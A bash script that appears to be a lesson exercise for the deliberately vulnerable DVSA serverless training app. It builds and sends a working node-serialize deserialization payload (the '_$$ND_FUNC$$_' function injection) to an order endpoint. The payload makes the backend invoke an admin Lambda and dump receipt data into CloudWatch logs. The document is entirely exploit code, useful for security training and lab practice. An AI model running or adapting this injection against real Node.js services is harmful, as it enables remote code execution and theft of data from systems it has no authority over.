#!/usr/bin/env bash
set -euo pipefail

# Lesson 3 - Sensitive Information Disclosure
# This script reproduces the vulnerable receipt disclosure path.
# Replace API with your own DVSA /order endpoint before running.

API="${API:-https://REPLACE-API-ID.execute-api.us-east-1.amazonaws.com/dvsa/order}"
YEAR="${YEAR:-2026}"
MONTH="${MONTH:-05}"

cat > lesson3_payload.json <<JSON
{"action":"_\$\$ND_FUNC\$\$_function(){var aws=require(\"aws-sdk\");var lambda=new aws.Lambda();var p={FunctionName:\"DVSA-ADMIN-GET-RECEIPT\",InvocationType:\"RequestResponse\",Payload:JSON.stringify({\"year\":\"$YEAR\",\"month\":\"$MONTH\"})};lambda.invoke(p,function(e,d){console.error(\"LESSON3_RECEIPT_RESULT:\"+JSON.stringify({error:e,data:d}));});}()","cart-id":""}
JSON

echo "[*] Sending Lesson 3 exploit request to: $API"
curl -s -X POST "$API" \
  -H "Content-Type: application/json" \
  --data-binary @lesson3_payload.json

echo
echo "[*] Check CloudWatch logs for /aws/lambda/DVSA-ORDER-MANAGER"
echo "[*] Search for: LESSON3_RECEIPT_RESULT"
